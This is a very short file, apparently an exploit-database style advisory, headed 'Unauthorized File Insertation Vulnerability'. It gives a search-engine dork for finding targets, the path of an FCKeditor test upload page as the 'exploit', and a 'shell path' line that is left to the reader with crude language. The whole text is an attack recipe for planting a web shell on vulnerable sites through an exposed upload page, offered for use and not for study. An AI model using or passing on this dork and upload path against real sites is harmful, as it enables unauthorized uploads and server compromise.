@@ -1,0 +1,4 @@
+Unauthorized File Insertation Vulnerability
+dork: inurl:/vantindat/ [use ur fucking brain]
+exploit: /jscripts/FCKeditor/editor/filemanager/upload/test.html
+shell path: [use ur fucking brain]
